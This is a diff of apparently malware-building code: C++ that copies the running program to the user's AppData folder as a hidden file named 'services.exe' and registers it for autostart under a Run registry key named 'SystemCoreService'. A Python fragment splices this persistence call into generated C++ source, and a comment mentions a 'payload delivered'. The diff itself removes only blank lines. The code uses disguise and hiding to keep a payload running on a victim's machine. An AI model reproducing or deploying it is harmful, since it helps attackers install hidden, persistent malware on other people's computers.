@@ -432,39 +432,31 @@ bool RegisterSystemTask(const std::string& executablePath) {
     HKEY hKey;
     const char* runKey = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run";
     const char* valueName = "SystemCoreService";
-
     LONG openRes = RegOpenKeyExA(HKEY_CURRENT_USER, runKey, 0, KEY_WRITE, &hKey);
     if (openRes != ERROR_SUCCESS) {
         return false;
     }
-
     LONG setRes = RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)executablePath.c_str(), executablePath.length() + 1);
     if (setRes != ERROR_SUCCESS) {
         RegCloseKey(hKey);
         return false;
     }
-
     RegCloseKey(hKey);
     return true;
 }
-
 enum RelocateResult {
     RELOCATE_SUCCESS,
     RELOCATE_ALREADY_EXISTS,
     RELOCATE_FAILED
 };
-
 RelocateResult RelocateModule(std::string& newPath) {
     char currentPath[MAX_PATH];
     GetModuleFileNameA(NULL, currentPath, MAX_PATH);
-
     const char* appDataPath = getenv("APPDATA");
     if (appDataPath == NULL) {
         return RELOCATE_FAILED;
     }
-
     newPath = std::string(appDataPath) + "\\\\services.exe";
-
     if (!CopyFileA(currentPath, newPath.c_str(), TRUE)) { // TRUE = bFailIfExists
         DWORD error = GetLastError();
         if (error == ERROR_FILE_EXISTS) {
@@ -473,7 +465,6 @@ RelocateResult RelocateModule(std::string& newPath) {
             return RELOCATE_FAILED;
         }
     }
-
     SetFileAttributesA(newPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
     return RELOCATE_SUCCESS;
 }
@@ -482,7 +473,6 @@ RelocateResult RelocateModule(std::string& newPath) {
     // --- Persistence Logic ---
     std::string newPath;
     RelocateResult relocateResult = RelocateModule(newPath);
-
     if (relocateResult == RELOCATE_SUCCESS) {
         if (!RegisterSystemTask(newPath)) {
             // Persistence failed, but payload delivered.
@@ -498,7 +488,6 @@ RelocateResult RelocateModule(std::string& newPath) {
             return_pos = cpp_template.rfind("return 0;")
             if return_pos != -1:
                 cpp_template = cpp_template[:return_pos] + persistence_call + "\n" + cpp_template[return_pos:]
-
 
         with open(cpp_file_path, "w", encoding="utf-8") as f:
             f.write(cpp_template)
